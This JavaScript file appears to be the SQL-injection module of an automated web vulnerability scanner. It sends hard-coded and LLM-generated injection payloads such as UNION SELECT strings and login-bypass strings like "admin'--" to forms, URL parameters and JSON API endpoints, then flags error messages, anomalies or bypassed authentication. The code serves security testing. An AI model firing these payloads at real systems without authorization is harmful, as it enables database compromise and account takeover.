const BaseAgent = require('./baseAgent');
const { timedRequest } = require('../utils/httpClient');
const ValidationEngine = require('../engine/validationEngine');
const { generatePayloads } = require('../llm/mistralClient');
const { appendParam } = require('../utils/urlHelper');

const INJECT_TIMEOUT = 8000;

// Filter out time-based payloads that cause unnecessary timeouts
function filterTimingPayloads(payloads) {
    const timingPatterns = /sleep|waitfor|delay|benchmark|pg_sleep|dbms_lock/i;
    return payloads.filter(p => !timingPatterns.test(p));
}

class InjectionAgent extends BaseAgent {
    constructor(logger, memory, findingsStore) {
        super('InjectionAgent', 'A03 - Injection', logger, memory, findingsStore);
        this.validator = new ValidationEngine(logger);
    }

    async execute(target) {
        const findings = [];
        const { forms, parameters } = this.memory.attackSurface;

        // Test form inputs (relaxed: 15 forms, 3 inputs each)
        for (const form of forms.slice(0, 15)) {
            const textInputs = form.inputs.filter(i =>
                ['text', 'search', 'email', 'password', 'hidden', 'number', ''].includes(i.type) && i.name
            );
            for (const input of textInputs.slice(0, 3)) {
                try {
                    const result = await this._testInjection(form.action, input.name, form.method);
                    findings.push(...result);
                } catch (err) {
                    this.logger.debug(`[InjectionAgent] Error testing ${form.action}/${input.name}: ${err.message}`);
                }
            }
        }

        // Test URL parameters (relaxed: 20 parameters)
        const seen = new Set();
        for (const param of parameters) {
            const key = `${param.url}-${param.param}`;
            if (seen.has(key)) continue;
            seen.add(key);
            if (seen.size > 20) break;
            try {
                const result = await this._testParameterInjection(param.url, param.param);
                findings.push(...result);
            } catch (err) {
                this.logger.debug(`[InjectionAgent] Error testing param ${param.param}: ${err.message}`);
            }
        }

        // Test API endpoints (fuzz common parameters in JSON bodies)
        const seenApis = new Set();
        // Generalized high-risk keywords for prioritization
        const highRiskKeywords = [
            'login', 'signin', 'auth', 'user', 'profile', 'account', 'search', 'query',
            'product', 'item', 'order', 'track', 'checkout', 'admin', 'config', 'settings',
            'api', 'rest', 'v1', 'v2', 'password', 'secure', 'private'
        ];

        const isInteresting = (api) => highRiskKeywords.some(kw => api.toLowerCase().includes(kw.toLowerCase()));

        const interestingApis = this.memory.attackSurface.apiEndpoints.filter(isInteresting);
        // Put interesting ones first
        const candidates = [...new Set([...interestingApis, ...this.memory.attackSurface.apiEndpoints])];

        for (const api of candidates) {
            if (seenApis.has(api)) continue;
            seenApis.add(api);
            if (seenApis.size > 30) break; // Increased limit for better coverage

            // Focus on endpoints that look interesting for injection
            if (isInteresting(api)) {
                try {
                    const result = await this._testApiInjection(api);
                    findings.push(...result);
                } catch (err) {
                    this.logger.debug(`[InjectionAgent] Error testing API ${api}: ${err.message}`);
                }
            }
        }

        return findings;
    }

    async _testInjection(url, inputName, method) {
        const findings = [];

        // Capture baseline
        const baselineData = method === 'POST' ? { [inputName]: 'testvalue123' } : undefined;
        const baselineParams = method === 'GET' ? { [inputName]: 'testvalue123' } : undefined;
        const baselineResponse = await timedRequest(url, {
            method, data: baselineData, params: baselineParams, timeout: INJECT_TIMEOUT,
        });
        const baseline = this.validator.captureBaseline(baselineResponse);

        // Generate payloads via LLM (error-based and UNION-based only)
        let payloads;
        try {
            payloads = await generatePayloads({
                vulnType: 'SQL Injection (error-based and UNION-based ONLY. Do NOT include time-based like SLEEP or WAITFOR or BENCHMARK)',
                targetContext: `Form input field: ${inputName}`,
                inputField: inputName,
                count: 4,
            });
            payloads = filterTimingPayloads(payloads);
        } catch {
            payloads = [
                "' OR '1'='1",
                "' OR 1=1--",
                "' UNION SELECT NULL,NULL--",
                "1' AND '1'='1",
            ];
        }

        for (const payload of payloads.slice(0, 4)) {
            try {
                const testData = method === 'POST' ? { [inputName]: payload } : undefined;
                const testParams = method === 'GET' ? { [inputName]: payload } : undefined;
                const testResponse = await timedRequest(url, {
                    method, data: testData, params: testParams, timeout: INJECT_TIMEOUT,
                });

                const comparison = this.validator.compareResponses(baseline, testResponse);
                const stackTrace = this.validator.detectStackTrace(testResponse.data);
                const timing = this.validator.detectTimingAnomaly(baseline.timingMs, testResponse.timingMs);

                let suspicious = false;
                let evidence = [];
                let consistencyScore = 0;

                if (stackTrace.detected) {
                    suspicious = true;
                    evidence.push(`SQL error patterns detected: ${stackTrace.patterns.join(', ')}`);
                    consistencyScore += 0.4;
                }

                if (timing.anomalous) {
                    suspicious = true;
                    evidence.push(`Time-based anomaly: ${timing.deltaMs}ms delay (ratio: ${timing.ratio.toFixed(2)}x)`);
                    consistencyScore += 0.3;
                }

                if (comparison.statusChanged && testResponse.status >= 500) {
                    suspicious = true;
                    evidence.push(`Server error triggered: status ${testResponse.status}`);
                    consistencyScore += 0.3;
                }

                if (comparison.anomalyScore > 0.5) {
                    suspicious = true;
                    evidence.push(`High anomaly score: ${comparison.anomalyScore}`);
                    consistencyScore += 0.2;
                }

                if (suspicious) {
                    const confidence = this.validator.calculateConfidence(comparison.anomalyScore, consistencyScore);
                    this.addFinding({
                        type: 'SQL Injection',
                        endpoint: url,
                        parameter: inputName,
                        description: `Possible SQL injection vulnerability detected in ${inputName}`,
                        evidence: evidence.join('; '),
                        payload,
                        confidenceScore: confidence,
                        exploitScenario: `An attacker can inject SQL commands through the "${inputName}" parameter to manipulate database queries`,
                        impact: 'Data theft, unauthorized access, data modification, or complete database compromise',
                        reproductionSteps: [
                            `1. Navigate to: ${url}`,
                            `2. Locate the input field named "${inputName}"`,
                            `3. Enter the following payload: ${payload}`,
                            `4. Submit the form using ${method} method`,
                            `5. Observe: ${evidence.join('; ')}`,
                        ],
                    });
                    findings.push({ type: 'SQL Injection', endpoint: url, parameter: inputName });
                    break;
                }
            } catch (err) {
                this.logger.debug(`[InjectionAgent] Payload test error: ${err.message}`);
            }
        }

        return findings;
    }

    async _testParameterInjection(url, paramName) {
        const findings = [];
        const { URL } = require('url');

        // Capture baseline
        const baselineResponse = await timedRequest(url, { timeout: INJECT_TIMEOUT });
        const baseline = this.validator.captureBaseline(baselineResponse);

        const payloads = ["' OR '1'='1", "1 OR 1=1", "'; SELECT 1--", "' UNION SELECT NULL--"];

        for (const payload of payloads) {
            try {
                const testUrl = appendParam(url, paramName, payload);
                const testResponse = await timedRequest(testUrl, { timeout: INJECT_TIMEOUT });

                const comparison = this.validator.compareResponses(baseline, testResponse);
                const stackTrace = this.validator.detectStackTrace(testResponse.data);

                if (stackTrace.detected || comparison.anomalyScore > 0.5) {
                    const confidence = this.validator.calculateConfidence(comparison.anomalyScore, stackTrace.detected ? 0.6 : 0.2);
                    const evidenceStr = stackTrace.detected ? `Error patterns: ${stackTrace.patterns.join(', ')}` : `Anomaly score: ${comparison.anomalyScore}`;
                    this.addFinding({
                        type: 'SQL Injection',
                        endpoint: url,
                        parameter: paramName,
                        description: `Possible SQL injection via URL parameter "${paramName}"`,
                        evidence: evidenceStr,
                        payload,
                        confidenceScore: confidence,
                        exploitScenario: `Attacker can manipulate the ${paramName} URL parameter to inject SQL`,
                        impact: 'Database compromise, data exfiltration',
                        reproductionSteps: [
                            `1. Open URL: ${testUrl}`,
                            `2. The parameter "${paramName}" contains the payload: ${payload}`,
                            `3. Observe: ${evidenceStr}`,
                        ],
                    });
                    findings.push({ type: 'SQL Injection', endpoint: url, parameter: paramName });
                    break;
                }
            } catch (_) { }
        }

        return findings;
    }
    async _testApiInjection(url) {
        const findings = [];
        const payloads = [
            { email: "' OR 1=1--", password: "a" },
            { email: "admin'--", password: "a" },
            { email: "' OR '1'='1", password: "a" },
            { username: "' OR 1=1--", password: "a" },
            { id: "1' OR '1'='1" },
            { q: "apple' OR 1=1--" }
        ];

        try {
            // Capture baseline
            const baselineResponse = await timedRequest(url, { method: 'POST', data: { email: 'test', password: 'test' }, timeout: INJECT_TIMEOUT });
            const baseline = this.validator.captureBaseline(baselineResponse);

            for (const payload of payloads) {
                try {
                    const testResponse = await timedRequest(url, { method: 'POST', data: payload, timeout: INJECT_TIMEOUT });
                    const stackTrace = this.validator.detectStackTrace(testResponse.data);

                    let suspicious = false;
                    let evidenceStr = '';

                    if (testResponse.status === 200 && testResponse.data && testResponse.data.authentication) {
                        suspicious = true;
                        evidenceStr = "Authentication bypassed via SQL injection (200 OK with token)";
                    } else if (stackTrace.detected) {
                        suspicious = true;
                        evidenceStr = `SQL Error patterns: ${stackTrace.patterns.join(', ')}`;
                    } else if (testResponse.status >= 500 && JSON.stringify(testResponse.data).toLowerCase().includes('sqlite')) {
                        suspicious = true;
                        evidenceStr = `SQLite Error detected in 500 response`;
                    }

                    if (suspicious) {
                        const payloadStr = JSON.stringify(payload);
                        this.addFinding({
                            type: 'SQL Injection',
                            endpoint: url,
                            parameter: "JSON Body",
                            description: `SQL injection vulnerability detected in API endpoint`,
                            evidence: evidenceStr,
                            payload: payloadStr,
                            confidenceScore: 0.95,
                            exploitScenario: `Attacker can send crafted JSON to bypass authentication or maliciously interact with the database`,
                            impact: 'Authentication bypass, Database compromise, Data exfiltration',
                            reproductionSteps: [
                                `1. Send POST request to: ${url}`,
                                `2. Set Content-Type header to application/json`,
                                `3. Send the following JSON payload: ${payloadStr}`,
                                `4. Observe: ${evidenceStr}`,
                            ],
                        });
                        findings.push({ type: 'SQL Injection', endpoint: url, parameter: "JSON Body" });
                        break;
                    }
                } catch (_) { }
            }
        } catch (_) { }
        return findings;
    }
}

module.exports = InjectionAgent;
